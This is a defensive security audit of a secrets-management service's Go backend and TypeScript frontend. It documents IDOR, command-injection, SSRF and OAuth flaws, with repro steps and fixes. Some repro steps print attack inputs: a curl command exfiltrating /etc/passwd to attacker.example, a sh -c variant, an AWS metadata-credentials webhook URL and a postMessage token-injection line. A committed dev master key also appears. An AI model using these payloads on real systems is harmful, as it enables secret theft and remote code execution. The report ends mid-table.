# KeepSave Security Audit — 2026-05-15

**Auditor:** Security Auditor (Security Engineer role per `docs/ROLES.md` §2.2)
**Scope:** backend Go, frontend TS/TSX, migrations, docker-compose, Dockerfiles, dep manifests
**Baseline:** `docs/THREAT_MODEL.md` v1.2.0 (2026-05-12)
**Prior audits referenced:** `docs/audits/API_RECONCILIATION.md`, `docs/audits/BACKEND_SPOF.md`, repo-root `SECURITY_AUDIT.md`
**Status:** Read-only / report-only. No code changes proposed in this audit.

---

## 1. Scope and methodology

### 1.1 What was covered

- `/home/user/KeepSave/backend/**/*.go` — full read of `internal/api/handlers_*.go`, `internal/api/middleware.go`, `internal/api/router.go`, `internal/auth/*`, `internal/crypto/*`, `internal/service/secret_service.go`, `internal/service/project_service.go`, `internal/service/apikey_service.go`, `internal/service/auth_service.go`, `internal/service/oauth_service.go`, `internal/service/promotion_service.go`, `internal/service/webhook_service.go`, `internal/service/lease_service.go`, `internal/service/sso_service.go`, `internal/repository/{project,secret,apikey}_repo.go`, `internal/logging/*`, `internal/config/config.go`, `internal/models/models.go`, `cmd/server/main.go`.
- Targeted reads on repository SQL where `fmt.Sprintf` appeared near query strings.
- `/home/user/KeepSave/frontend/src/embed/{auth.ts,widget.ts,keepsave-widget.ts}`, `frontend/src/api/client.ts`, `frontend/src/hooks/useAuth.ts`, `frontend/src/pages/HelpPage.tsx` (auth storage).
- `/home/user/KeepSave/backend/migrations/001_initial_schema.sql` (canonical schema).
- `/home/user/KeepSave/docker-compose.yml`, `backend/Dockerfile`, `frontend/Dockerfile`.
- `/home/user/KeepSave/backend/go.mod`, `frontend/package.json`.

### 1.2 What was skipped (with justification)

- `backend/migrations/{002..008}.sql` — only spot-checked. Schema-evolution audit is a separate Type-1 effort.
- `backend/internal/api/handlers_intelligence.go` beyond first 150 lines, all `internal/service/{drift,anomaly,usage_analytics,recommendation,nlp_query,ai_provider}_service.go` — Phase 15 surface; threat surface is `/api/v1/projects/:id/drift|anomalies|analytics` which inherits the same IDOR class as the rest of `/projects/:id/...` (see Section 3.A01).
- `tests/e2e/seidr/` — integration harness, not in scope.
- `helm/`, `scripts/`, `.github/workflows/` — deployment config audit out of scope here (covered by DevOps via `docs/CI_PERMISSIONS.md`).
- `sdks/`, `integrations/` — client-side, separate trust boundary.

### 1.3 Tools

No automated SAST/govulncheck/npm-audit was run as part of this pass — review was pure code-read against the threat model. Where dep CVEs are noted, versions in `go.mod`/`package.json` are cited and the reader is expected to run `govulncheck` / `npm audit` to confirm. CI already gates on these per `SECURITY_AUDIT.md` line 54.

---

## 2. Executive summary

### 2.1 Counts by severity

| Severity | Count | Notes |
|----------|-------|-------|
| **P1 Critical** | **6** | Authenticated cross-tenant data exfiltration via `/projects/:id/...` IDOR family; promotion-engine IDOR allows promoting any project's secrets; env-export IDOR dumps any project's plaintext; key-rotation IDOR; promotion `Diff` returns cross-tenant plaintext; MCP entry-command command-injection |
| **P2 High** | **5** | Embed widget wildcard postMessage; OAuth public-client without forced PKCE; CSRF middleware coded but not registered; webhook SSRF; promotion `Diff` plaintext echo to any caller (separately scored as info-disclosure) |
| **P3 Medium** | **6** | Username enumeration via `/users/lookup`; CORS default `*`; JWT in localStorage; dev MASTER_KEY checked into repo; query strings logged; `ks_` API keys have no enforced expiry |
| **P4 Low** | **4** | Dockerfiles run as root; PKCE `plain` advertised; `rand.Read` error unchecked in OAuth helpers; logger logs query string |
| **P5 Info** | **5** | No MFA; no JWT denylist; no key-rotation audit assertions; no MCP server entry-command allowlist; audit-log not tamper-evident |

### 2.2 Top 5 most-concerning findings (1-line each)

1. **P1 — Secret CRUD has no project-access check.** `handlers_secret.go:33,55,81,109,131` + `secret_service.go:41,74,105,139,174` — any authenticated user (or any API key) that knows a project UUID can read/write/delete its secrets.
2. **P1 — API-key project scope is set in middleware but never enforced.** `middleware.go:108` sets `api_key_project_id`; only `handlers_agent.go:42-52` consumes it. All other API-key-authed routes ignore scope.
3. **P1 — `/projects/:id/env-export` returns plaintext for any project ID.** `handlers_envfile.go:19-45` no ownership check; bulk-exfiltration path.
4. **P1 — `/projects/:id/promote/diff` returns *plaintext* source and target values to any authenticated caller.** `models.DiffEntry.SourceValue/TargetValue` (`models.go:146-147`) carry strings; `promotion_service.go:131,140` populates them. Contradicts `THREAT_MODEL.md` §3 "Diff redacts values" claim. No project-access check at handler.
5. **P1 — MCP gateway `exec.Command` with database-stored entry command.** `handlers_mcp_gateway.go:327-339` splits and execs `server.EntryCommand`. The string source is user-registered via `handlers_mcp.go:39`. If registration is loose, this is an authenticated RCE primitive.

---

## 3. Findings by OWASP category

### A01 — Broken Access Control / IDOR

This is the dominant finding class. The `/api/v1/projects/:id/...` route family is mounted with `JWTAuthMiddleware` or `APIKeyAuthMiddleware`, both of which only **identify** the caller — neither enforces that the caller has access to `:id`. Project ownership is checked in `ProjectService.GetByID/Update/Delete` for direct `/projects/:id` reads/writes (`project_service.go:53-87`), but **the check is not reused** by sibling routes.

#### A01-F1 — Secret CRUD IDOR *(P1 Critical)*

- **Evidence:**
  - Handler: `backend/internal/api/handlers_secret.go:20-137` (Create/List/Get/Update/Delete).
  - Service: `backend/internal/service/secret_service.go:41-183`. Each method calls `s.projectRepo.GetByID(projectID)` to fetch the encrypted DEK but never asserts the project belongs to the authenticated user.
  - Route: `backend/internal/api/router.go:75-85` (`sec := v1.Group("/projects/:id/secrets")` with `APIKeyAuthMiddleware`).
- **Repro:**
  1. User A creates project P_A; user B creates project P_B.
  2. User B (with valid JWT for B) sends `GET /api/v1/projects/<P_A id>/secrets?environment=alpha`.
  3. Service decrypts P_A's DEK with master key (no membership check), decrypts all secrets, returns plaintext.
- **Fix:** Add `projectRepo.GetByOwner(projectID, userID)` (or equivalent membership lookup) at top of every secret-service method. Reject before any DEK material is touched.
- **Threat model row affected:** invalidates the "Resource ownership" check claim in `SECURITY_AUDIT.md` line 9; not yet reflected in `THREAT_MODEL.md`.

#### A01-F2 — API key scope not enforced *(P1 Critical)*

- **Evidence:**
  - `backend/internal/api/middleware.go:107-112` sets `api_key_project_id`, `api_key_scopes`, `api_key_environment` into context.
  - `grep -rn "api_key_project_id" backend/internal/api/` returns **one** consumer: `handlers_agent.go:42`. Secret handlers, version handlers, webhook handlers, env-file handlers — none read it.
- **Repro:**
  1. User creates two projects P1, P2.
  2. User issues an API key scoped to P1 only (`apikey_service.go:33-60`; row stores `project_id`).
  3. Attacker who exfiltrates the P1 key uses `X-API-Key: <P1 key>` against `GET /api/v1/projects/<P2 id>/secrets?environment=prod`.
  4. Middleware accepts the key (it's valid). Handler doesn't compare key's `project_id` to path `:id`. Secrets of P2 returned.
- **Fix:** New helper `requireProjectAccess(c, projectID)` that, when `api_key_project_id` is set, asserts equality with path projectID. Same helper enforces `api_key_environment` if non-nil. Same helper checks `api_key_scopes` against the operation.
- **Threat model row affected:** `THREAT_MODEL.md` Section 2 row E "API key scope escalation" claims residual Low — **invalidated**. Reset to High pending fix.

#### A01-F3 — `/projects/:id/env-export` and `/env-import` IDOR *(P1 Critical)*

- **Evidence:** `backend/internal/api/handlers_envfile.go:19-67`. Both `Export` and `Import` parse `:id` and call service without any membership check. Export returns plaintext `.env` content.
- **Repro:** identical to A01-F1, single HTTP request bulk-exfiltrates every secret of a target project as a downloadable file.
- **Fix:** Same as A01-F1.

#### A01-F4 — `/projects/:id/promote/diff` IDOR + plaintext leak *(P1 Critical)*

- **Evidence:**
  - `backend/internal/api/handlers_promotion.go:60-85` (`Diff`) parses `:id`, calls `promotionService.Diff`, no auth check.
  - `backend/internal/service/promotion_service.go:70-156` decrypts source and target secrets and stores them in `entry.SourceValue` / `entry.TargetValue` (lines 131, 140).
  - `backend/internal/models/models.go:142-150` `DiffEntry` has `SourceValue string` and `TargetValue string` — **plaintext** carried to the JSON response.
- **Threat model claim invalidated:** `THREAT_MODEL.md` Section 3 row I "Diff leaks plaintext" says "Diff redacts values; only keys + action shown — review needed" → residual Low. **The review now confirms: the diff does not redact, and there's no ownership check either.** Residual = **High** until both issues are fixed.
- **Repro:**
  1. Any authenticated user posts `{ source_environment: "uat", target_environment: "prod" }` to `/api/v1/projects/<victim project id>/promote/diff`.
  2. Response body contains decrypted UAT and PROD secret values for every key.
- **Fix:**
  - Add project-access check at handler/service layer.
  - Remove `SourceValue` and `TargetValue` from `DiffEntry` (or hash them with a per-project salt so diffs show "same/different" without revealing). Diff should show keys + `Action` (`add`/`update`/`no_change`) only, matching the threat-model claim.

#### A01-F5 — `/projects/:id/rotate-keys` IDOR *(P1 Critical)*

- **Evidence:** `backend/internal/api/handlers_keyrotation.go:22-39` `RotateProjectKey` — no ownership check before rotating the DEK of any project.
- **Repro:** Authenticated attacker calls `POST /api/v1/projects/<victim project id>/rotate-keys`. Service re-encrypts the victim's secrets with a new DEK. No data is destroyed (rotation re-encrypts in place), but the attack:
  - Generates an audit-significant operation that the victim did not authorize.
  - Acts as a denial-of-service vector by saturating CPU during mass-rotation.
- **Fix:** Same as A01-F1 — add ownership check.
- **Note:** `RotateAllKeys` (`handlers_keyrotation.go:42-55`) is fine — it operates on `userID` from context.

#### A01-F6 — Enterprise endpoints IDOR (`/projects/:id/policy`, `/backups`, `/agent-activity`, `/agent-heatmap`, `/access-policies`, `/recommendations`, `/dependencies`, all of `intelligenceHandler.*`) *(P1 Critical)*

- **Evidence:** `backend/internal/api/handlers_enterprise.go:31-220`, `handlers_dependency.go:20-66`, `handlers_intelligence.go:32-150` (and following). Every handler parses `:id` from path and calls the service directly with no ownership check.
- **Repro:** Same pattern. The `/policy` endpoint can be flipped on any project (set unreasonable rotation deadlines); `/backups` can list any project's backup history.
- **Fix:** Centralize project-access middleware (see remediation §6, top item).

#### A01-F7 — Lease revocation has no owner check *(P2 High)*

- **Evidence:** `backend/internal/service/lease_service.go:94-102` `RevokeLease(leaseID)` does `UPDATE secret_leases SET revoked = true WHERE id = $1` with no scoping. Handler `handlers_agent.go:81-91` calls it directly.
- **Repro:** Attacker with any valid API key revokes any other tenant's lease by ID.
- **Fix:** Service must `SELECT api_key_id FROM secret_leases WHERE id = ?` and compare to caller's `api_key_id` before update.

#### A01-F8 — `/projects/:id/secrets/:secretId/versions[/...]` *(P2 High — partial)*

- **Evidence:** `backend/internal/api/handlers_version.go:36-89, 92-150`. The handler **does** check `secret.ProjectID == projectID` (lines 56-58, 118-120), but never checks the caller has access to `projectID`. Same IDOR class as A01-F1.

#### A01-F9 — Secret-policy mutation lacks ownership *(P2 High)*

- **Evidence:** `handlers_enterprise.go:199-223` `SetSecretPolicy` mutates the project's rotation policy. Same IDOR.

#### A01-F10 — Webhook registration IDOR *(P2 High)*

- **Evidence:** `handlers_webhook.go:28-56` registers a webhook on any projectID. Combined with SSRF (A10-F1) this is a critical chain.

#### A01-F11 — User existence enumeration *(P3 Medium)*

- **Evidence:** `handlers_auth.go:39-53` `LookupUser` returns 404 vs 200 by email. Authenticated (`router.go:62`) but enables intra-tenant user enumeration.
- **Fix:** Either remove the endpoint (it's nearly useless without an obvious workflow) or always 200 with a generic shape.

### A02 — Cryptographic Failures

#### A02-F1 — AES-GCM nonce uniqueness: **PASS with caveat**

- **Evidence:** `backend/internal/crypto/crypto.go:69-72` generates a fresh 12-byte random nonce per encryption via `io.ReadFull(rand.Reader, nonce)`. Per ADR-0001 acceptable up to ~2^32 messages per key. No counter exists yet; tracked as Follow-up #7 in `docs/FOLLOWUPS.md`. **No new finding.**

#### A02-F2 — Master key handling: **PASS**

- **Evidence:** `cmd/server/main.go:54-65` loads master key into memory and never logs it. No `log.*` or `fmt.Print*` reference master-key bytes anywhere in the codebase (grep clean). **No new finding.** Existing follow-up: secure-zero on shutdown is still open.

#### A02-F3 — API key hash algorithm too weak *(P3 Medium)*

- **Evidence:** `backend/internal/auth/apikey.go:21-32`. SHA-256 of the raw key is used both for storage and for lookup. Lookup is `WHERE hashed_key = $1` (`apikey_repo.go:64-77`), so the DB does the compare — **constant time relative to a single row**, but the SHA-256 of a 32-byte high-entropy random is fine cryptographically. The issue is policy, not algorithm: if the DB is dumped, SHA-256 over 32-byte random is uncrackable, so the SHA-256 choice is acceptable. **Caveat:** Argon2id would future-proof against shorter customer-rotated keys; not a blocking finding for current key-generation scheme. **Info-level finding only.**

#### A02-F4 — JWT algorithm confusion: **PASS**

- **Evidence:** `backend/internal/auth/auth.go:50-52` explicitly rejects non-HMAC algorithms (`if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok`). `alg: none` cannot pass this check. The `jwt/v5` library further prevents alg confusion. **No new finding.**

#### A02-F5 — JWT secret length not enforced *(P4 Low)*

- **Evidence:** `backend/internal/config/config.go:76-79` requires `JWT_SECRET` to be non-empty, but does not require a minimum length. `docker-compose.yml:26` ships `JWT_SECRET: dev-jwt-secret-change-me` — 23 chars, brute-forceable in offline attack if a JWT leaks. The dev-default lives only in compose, not in code defaults, so production deployments are not affected if operators rotate. Still a developer-experience footgun.
- **Fix:** `config.go` should require ≥ 32 bytes of entropy in production mode.

#### A02-F6 — TLS: optional, default off *(P3 Medium for prod posture)*

- **Evidence:** `cmd/server/main.go:207-227` uses `srv.ListenAndServeTLS` only if `TLS_CERT_FILE` and `TLS_KEY_FILE` are set; falls back to plain `router.Run`. `Strict-Transport-Security` header is set unconditionally (`security_headers.go:21`) — **incorrect when TLS is off** (HSTS over HTTP is ignored by browsers, but the policy intent is misaligned with the actual posture).
- **Note:** Architecture assumes TLS termination in front of the API (`THREAT_MODEL.md` "Assumptions"). The assumption is unverified per environment. **No code change required if the runbook confirms reverse-proxy TLS.**

### A03 — Injection

- **SQL:** All repository queries reviewed use `$1, $2, ...` placeholders. The only `fmt.Sprintf` near SQL is parametrized — placeholder indexes computed before `args` are bound (`repository/application_repo.go:55,60`, `dialect.go:61,114,158`, `queryhelper.go:77,109,145`). Limit/offset format in `application_repo.go:76` uses ints converted via `strconv.Atoi` (`handlers_application.go:64,72`), bounded ≤ 100. **No SQL injection finding.**

#### A03-F1 — Command injection via MCP entry command *(P1 Critical)*

- **Evidence:** `backend/internal/api/handlers_mcp_gateway.go:327-339`. `server.EntryCommand` is a string field set on registration (`handlers_mcp.go:39`, `mcp_service.go:46`). `strings.Fields(server.EntryCommand)` splits, then `exec.Command(parts[0], parts[1:]...)` executes.
- **Repro:**
  1. Authenticated user registers an MCP server (`POST /api/v1/mcp/servers`) with `entry_command: "/usr/bin/curl http://attacker.example/exfil?$(cat /etc/passwd | base64 -w0)"` — though `exec.Command` does not invoke a shell, so shell metacharacters do not expand. **However**, the user can directly specify any binary on the container's PATH: `entry_command: "/bin/sh -c 'curl http://attacker.example/...'"`. Since `exec.Command` *does* honor `parts[0]` as the program name verbatim, `/bin/sh -c '...'` works.
  2. Attacker then issues an MCP tool call against this server. The container executes the attacker's command with the container's permissions, with `cmd.Env` containing decrypted secrets.
- **Severity P1 (authenticated RCE)** because:
  - Decrypted secrets are passed as env vars (`handlers_mcp_gateway.go:301`).
  - The MCP build dir is on the API container filesystem (`builderService.GetBuildDir`).
  - Any user can register an MCP server (registration auth is per-user, not admin-gated).
- **Fix:**
  - Restrict MCP server registration to an allowlist of entry-command binaries.
  - Reject any entry command containing shell-metacharacter words.
  - Better: sandbox MCP execution (containerized) per server.
  - Best: do not pass plaintext secrets via env to a user-controlled binary — that's the architectural root cause.

### A04 — Insecure Design

#### A04-F1 — Approver = requester not enforced *(P2 High, known)*

- **Evidence:** `backend/internal/service/promotion_service.go:215-240` `ApprovePromotion(promotionID, approverID)` updates status without checking `promotion.RequestedBy != approverID`. Confirms the existing FOLLOWUPS #5 / #0d.
- **Repro:** Single compromised account can request a PROD promotion (`promotion_service.go:181`) and then approve it themselves.
- **Fix:** `if promotion.RequestedBy == approverID { return error }` at the top of `ApprovePromotion`. Add a DB-level CHECK constraint as defense-in-depth.

#### A04-F2 — Embed widget: wildcard postMessage *(P2 High, known)*

- **Evidence:** `frontend/src/embed/auth.ts:21-26, 33`. Confirms `THREAT_MODEL.md` v1.2.0 finding and `EMBED_ORIGIN_POLICY.md` work item.
- **Exploitability confirmed:** **Yes.** The listener accepts `keepsave-auth` messages from any source (`ev.origin` not read at line 21-26). A malicious host page hosting the widget can `window.frames[0].postMessage({type:'keepsave-auth', token: attackerToken}, '*')` from itself, the widget will accept it, and all subsequent widget API calls run with the attacker's token. The classic confused-deputy: the legitimate user's UI shows the attacker's secrets.
- **Severity:** P2 High (requires user to visit a malicious embedding page; not pre-auth, but no other user interaction needed).
- **Fix:** Per `EMBED_ORIGIN_POLICY.md` §2 — origin allow-list fetched from `/api/v1/projects/:id/embed-config`, strict `ev.origin` check on inbound, never `'*'` on outbound.

#### A04-F3 — CSRF middleware exists but is not registered *(P2 High)*

- **Evidence:** `backend/internal/api/csrf.go:13-55` defines `CSRFMiddleware()`. `grep -rn CSRFMiddleware backend/` returns only the definition. `router.go` does not mount it.
- **Implication:** JWT in `Authorization: Bearer ...` is not auto-attached by browsers (mitigates classic CSRF), **but** the dashboard stores the JWT in `localStorage` (`api/client.ts:27-31`) and reads it in JS, so the JWT mode is not vulnerable to CSRF directly. The CSRF middleware was clearly written to be plugged in. As written it's dead code, which is itself a security smell (developers may believe it's active).
- **Recommendation:** Either delete `csrf.go` with a note in CHANGELOG (and document that bearer-token + non-cookie auth makes CSRF non-applicable), or mount it on cookie-bearing routes if any get added.

#### A04-F4 — OAuth: public-client doesn't require PKCE *(P2 High)*

- **Evidence:** `backend/internal/service/oauth_service.go:109-121`. If `client.IsPublic`, the client_secret check is skipped (line 109). The PKCE check (line 117) only triggers when `authCode.CodeChallenge != ""` — meaning the public client could omit PKCE at `/authorize` and the exchange still succeeds.
- **Fix:** If `client.IsPublic`, require non-empty `authCode.CodeChallenge` and `S256` method.

#### A04-F5 — OAuth: PKCE `plain` advertised *(P4 Low)*

- **Evidence:** `handlers_oauth.go:238` advertises `code_challenge_methods_supported: ["S256", "plain"]`. `oauth_service.go:255` falls through to compare verifier == challenge if method != `S256`. `plain` PKCE is deprecated (RFC 7636 §4.2).
- **Fix:** Drop `plain` from the metadata response and reject it server-side.

#### A04-F6 — Key rotation: present, but no rotation cadence policy *(P5 Info)*

- **Evidence:** `KeyRotationService` exists (`service/keyrotation_service.go`); ADR-0004 §Open Questions notes DEK rotation cadence is unset. Existing follow-up #3 covers it.

### A05 — Security Misconfiguration

#### A05-F1 — Real master key and JWT secret committed to repo *(P3 Medium)*

- **Evidence:** `docker-compose.yml:25-26` — `MASTER_KEY: 43uH/WMSJGjGgaJseq39Mt0h5eAoGgElK3k53ddRZMM=` (valid 32-byte b64 string) and `JWT_SECRET: dev-jwt-secret-change-me`. These are dev defaults but they are real, valid keys. Anyone who clones the repo can decrypt a dev deployment.
- **Mitigation that exists:** `config.go:82-87` rejects `CORS_ORIGINS=*` and `sslmode=disable` in production mode, but **does not** force a non-default `MASTER_KEY`/`JWT_SECRET`. A misconfigured "production" deployment could ship with these.
- **Fix:** Production-mode startup should reject the dev-default master key (compute its hash, refuse to start if matched) and refuse JWT secrets < 32 bytes.

#### A05-F2 — CORS default is `*` *(P3 Medium for dev, accepted)*

- **Evidence:** `config.go:81-84`. Default `CORS_ORIGINS=*` is allowed unless `KEEPSAVE_ENV=production`. The CORS middleware echoes the configured value verbatim (`middleware.go:46`) — `Access-Control-Allow-Origin: *`. Credentials are **not** enabled (no `Access-Control-Allow-Credentials: true`), so the worst case is read of public endpoints, which is acceptable for a CORS-permissive API.
- **No new finding** beyond noting that prod safety relies on operator setting `KEEPSAVE_ENV=production`.

#### A05-F3 — No CSP unsafe-inline, X-Frame-Options DENY: **PASS**

- **Evidence:** `security_headers.go:14-22`. Strong CSP. **No finding.**

#### A05-F4 — Dockerfiles run as root *(P4 Low)*

- **Evidence:** `backend/Dockerfile` and `frontend/Dockerfile` — neither sets `USER`. Container processes run as root.
- **Fix:** `RUN adduser -D keepsave && USER keepsave` (matched in nginx image already runs nginx user, but the build steps are root).

#### A05-F5 — Debug endpoints: **PASS**

- `grep -rn "pprof"` returns nothing. No debug endpoints exposed.

### A06 — Vulnerable Components

- `go.mod` pins `gin-gonic/gin@v1.12.0`, `golang-jwt/jwt/v5@v5.3.1`, `lib/pq@v1.12.3`, `golang.org/x/crypto@v0.51.0`. The audit did not run `govulncheck`; CI already gates on it per `SECURITY_AUDIT.md:54`. `lib/pq v1.12.3` is pre-`pq` stability; CVE history is sparse for this driver but worth a periodic refresh review.
- `package.json` pins React 19, Vite 6, Vitest 4.1, jsdom 25, @testing-library/* — all current. `lucide-react@^1.8.0` is suspicious (most recent stable is v0.x for this package family — verify this is not a typo). **Recommend verifying `lucide-react` version in `package-lock.json`.**

### A07 — Identification & Auth Failures

#### A07-F1 — `ks_` API keys have no enforced expiry *(P3 Medium, known)*

- **Evidence:** `backend/internal/api/validation.go:33-38` `CreateAPIKeyRequest` has no `expires_at`. `apikey_service.go:33-60` `Create` accepts no expiry. `apikey_repo.go:33-36` INSERT omits the column → `expires_at` is NULL → middleware (`middleware.go:101-105`) treats NULL as "no expiry."
- **Cross-reference with the Day-30 research note:** This is the `ks_ no-TTL gap`. **Security-class severity:** P3 Medium standalone (a leaked agent key works forever). When combined with A01-F2 (API key scope not enforced), the chain becomes P2 — a leaked key for any project P1 reads every project, forever. **Recommendation: rate this gap as P2 in combination, not as a separate operational concern.**
- **Fix:** Add `ExpiresAt` to the create-request, default 90d, ceiling 365d per FOLLOWUPS #0k.

#### A07-F2 — No login lockout / brute-force lockout *(P3 Medium)*

- **Evidence:** Rate-limit middleware is global (`router.go:37`, `ratelimit.go:92-105`) — 100 req/s per IP, burst 200. There is **no per-account lockout** after N failed logins. An attacker rotating IPs can credential-stuff at scale.
- **Existing mitigation:** Rate-limit per IP and bcrypt cost slow per-attempt rate. **Insufficient for distributed attacks.**
- **Fix:** Per-email failure counter in `SecurityEvent` table; soft-lock after 10 consecutive failures.

#### A07-F3 — No MFA *(P5 Info)*

- No TOTP/WebAuthn paths exist. Acceptable for an MVP but expected to surface as a customer requirement.

#### A07-F4 — JWT denylist absent *(P3 Medium, known)*

- **Evidence:** `auth/auth.go:25-26`, threat-model row T in Section 2. Tracked as FOLLOWUPS Phase B.
- **Note:** Combined with A01-F2 (scope ignored), a leaked JWT is also forever-valid until 24h expiry on any project. Same chain principle as A07-F1.

### A08 — Software & Data Integrity Failures

#### A08-F1 — Audit log not tamper-evident *(P5 Info)*

- **Evidence:** `migrations/001_initial_schema.sql:66-77`. `audit_log` is a normal table with no hash-chain, MAC, or append-only DB constraint. Any actor with DB write access can `UPDATE`/`DELETE` rows.
- **Fix (longer-term):** HMAC each row with a per-row chain (`row.mac = HMAC(prev_row.mac || row_body, audit_key)`); store `audit_key` in KMS.

#### A08-F2 — Webhook HMAC: **PASS**

- `service/webhook_service.go:146-150` signs with HMAC-SHA256 and the `X-KeepSave-Signature: sha256=...` header. **No new finding.**

#### A08-F3 — Migration integrity *(P5 Info)*

- Migration files have no checksums tracked. `schema_migrations` only records version names. A malicious operator could rewrite a migration. Standard small-team risk; flagging as info.

### A09 — Logging / Monitoring Failures

#### A09-F1 — Query string logged verbatim *(P4 Low)*

- **Evidence:** `backend/internal/logging/gin_middleware.go:14, 24`. `query` is logged in every request entry.
- **Risk:** If a caller mistakenly passes a token or secret via querystring (`?token=...`), it lands in logs and downstream log sinks. Some endpoints accept querystring inputs (e.g., `?environment=prod`, `?email=...`). Email in `/users/lookup?email=` is now in logs in plaintext (PII).
- **Fix:** Redact `email`, `password`, `token`, `api_key`, `code`, `code_verifier`, `access_token`, `refresh_token`, `client_secret` query params before logging. Drop the `query` field in production mode.

#### A09-F2 — Secret/Project/APIKey mutations not audited *(P1 in the threat-model formulation, P2 here)*

- Already in `THREAT_MODEL.md` v1.2.0 "Findings new" §1 and `FOLLOWUPS.md` #0. **Audit confirms it — no new evidence beyond what's already documented.** Severity here is P2 (Repudiation lever exists; combined with A01-* findings, repudiation IS the cover for unauthorized access).

#### A09-F3 — Failed login attempts not in audit log *(P3 Medium)*

- `auth_service.go:64-75` returns errors but does not call `auditRepo.Create`. The `SecurityEvent` table exists (`models.go:341`) but no code emits to it. Auth events therefore have no historical record.

### A10 — SSRF

#### A10-F1 — Webhook URL allows internal targets *(P2 High)*

- **Evidence:** `webhook_service.go:136, 158`. `http.NewRequest("POST", config.URL, ...)` with no URL allowlist.
- **Repro:**
  1. Attacker authenticates (or compromises a key for) project P. Registers a webhook with `url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"` (AWS IMDS).
  2. Triggers any event (e.g., `promotion_completed` for P).
  3. The KeepSave API container makes the outbound request. Response status code is recorded (`webhook_service.go:185`); response body is **not** persisted, but the **request itself** can be a write or trigger (e.g., target an internal admin endpoint).
- **Severity:** P2 High because:
  - The webhook target is invoked from the KeepSave container's network position.
  - Response body is not echoed back, which limits the exfiltration variant, but cloud metadata APIs are query-only (no body needed; the *fact* that the call succeeded with 200 is an oracle).
- **Fix:**
  - Resolve URL hostname, reject any RFC1918 / loopback / link-local IP, including AWS IMDS (`169.254.169.254`), GCP metadata (`metadata.google.internal`), and Kubernetes service IPs.
  - Reject `http://` (HTTPS only).
  - Add the webhook into a denylist when delivery returns 200 from a denied target (defense-in-depth).

#### A10-F2 — SSO Issuer URL *(P4 Low)*

- **Evidence:** `service/sso_service.go:36` stores `IssuerURL` but **no current code path** dereferences it (OIDC discovery is not implemented). If/when it is wired, the same SSRF guard is needed.

---

## 4. Secrets-management-specific findings

#### S4-F1 — Promotion `Diff` exposes plaintext on cross-tenant request *(P1)*

- Already documented under A01-F4. The secrets-management framing: a `diff` operation is a planning step, not a read of any secret. It should never reveal values; it should reveal *only* the set of keys that would change. The current behavior makes Diff a *strictly stronger* read than Get.

#### S4-F2 — Secret value never logged on read paths: **PASS**

- `grep -rn 'log.*plaintext\|log.*Value' backend/internal/` returns nothing in the secret code path. Audit-log emissions in promotion (`promotion_service.go:357-364`) only log keys, not values. **No new finding.**

#### S4-F3 — Deleted secret value retrievable via versions *(P2 High)*

- **Evidence:** `handlers_secret.go:118-137` `Delete` removes the secret row. The `secret_versions` table (migration 003) stores historical values keyed by `secret_id`. **It is not clear whether secret-versions rows are cascade-deleted when the parent secret is deleted.**
- **Verify:** Check migration 003 for `ON DELETE CASCADE` on `secret_versions.secret_id`. If absent, version rows live on with their encrypted values. Combined with A01-F1 (IDOR), this means a "deleted" secret value is recoverable.
- **Fix:** Confirm cascade-delete; if missing, add migration; ensure version-list handler honours secret deletion.

#### S4-F4 — UAT-scoped API key can read PROD via IDOR chain *(P1 Critical, derived)*

- This is the secrets-management-shaped restatement of A01-F2. A UAT-scoped API key for any project, used against `GET /api/v1/projects/<any project id>/secrets?environment=prod`, will succeed today: middleware admits the key, handler does not check key environment, service decrypts. **The promotion pipeline's environment isolation is wholly defeated.**

#### S4-F5 — Webhook payload includes promoted-key list *(P5 Info, may be acceptable)*

- **Evidence:** `promotion_service.go:357-364` audits `promoted_keys` and `skipped_keys`. Webhook notifications likely echo similar data. Keys (not values) leaving the trust boundary via webhook is acceptable per spec, but the integrator must be told.
- **Recommend:** Document that webhook recipients see key names but never values.

---

## 5. THREAT_MODEL.md delta

The following rows in `docs/THREAT_MODEL.md` v1.2.0 have residual-risk claims that this audit invalidates or strengthens. A follow-up PR `docs(threat-model): update from 2026-05-15 audit` should rewrite these rows.

### 5.1 Rows invalidated (claim no longer holds)

| Section / Row | Claim today | Evidence | New residual |
|---|---|---|---|
| §2 row E (E — API key scope escalation) — residual **Low** | "Scope is row-bound; per-project / per-env enforced in handlers" | `middleware.go:107-112` sets context; only `handlers_agent.go:42-52` consumes it. All other API-key-authed routes ignore scope. (A01-F2) | **High** |
| §3 row I (I — Diff leaks plaintext) — residual **Low** | "Diff redacts values; only keys + action shown" | `models.go:142-150` plus `promotion_service.go:131,140` carry plaintext into the response. (A01-F4) | **High** |
| §1 row T (T — DEK or ciphertext tampered in DB) — residual **Low** | "AES-GCM auth tag rejects tampered input" | Still holds for the cipher primitive, but no integration test asserts it on a backup-style copy. Follow-up #2 already covers this. | **Low** but with FU#2 explicitly in scope of next re-baseline |
| §1 row R (R — Key rotation without audit trail) — residual **Medium** | "`keyrotation_service` writes audit entries" | This audit did not verify emission; cross-checked with A05/A01-F5 (rotation can be triggered cross-tenant). Re-classify residual until verified. | **Medium-High** pending FU verification |

### 5.2 New rows to add

| Section | STRIDE | Threat | Mitigation | Residual | Notes |
|---|---|---|---|---|---|
| §2 (Auth) | E | **JWT scope absent — single JWT grants access to all of caller's projects without per-project bind** | Add project-membership middleware. | **High today** | Inverse formulation of A01-F1: JWTs don't carry project scope at all. |
| §3 (Promotion) | I | **Plaintext leak via Diff** | Remove `SourceValue/TargetValue` from response. | **High today** | A01-F4. |
| §4 (Embed widget) | S | Inbound `keepsave-auth` accepted from any origin (already in v1.2.0). | Allow-list per `EMBED_ORIGIN_POLICY.md`. | **High today** | Confirmed exploitable. |
| §6 (new section) **MCP Gateway tool execution** | E | `exec.Command` on user-supplied `EntryCommand` with decrypted secrets in env | Sandbox MCP execution; allowlist binaries; do not pass plaintext secrets via env to user binaries. | **Critical today** | A03-F1. New section warranted; current `THREAT_MODEL.md` §5 covers MCP transport but not tool execution. |
| §1 (Vault) | I | Webhook SSRF can reach IMDS / metadata APIs | URL allowlist; deny RFC1918 / link-local. | **High today** | A10-F1. |
| §7 (new) **Secret-versions retention** | I | Deleted secrets retrievable via `secret_versions` if cascade missing | Verify cascade; add tombstone. | **Medium** | S4-F3 (verify required). |

---

## 6. Remediation priority (top 10)

Ordered by severity × exploitability, with effort and suggested owner. Blocking dependencies noted.

| # | Finding | Sev | Effort | Owner | Blocking dep |
|---|---|---|---|---|---|
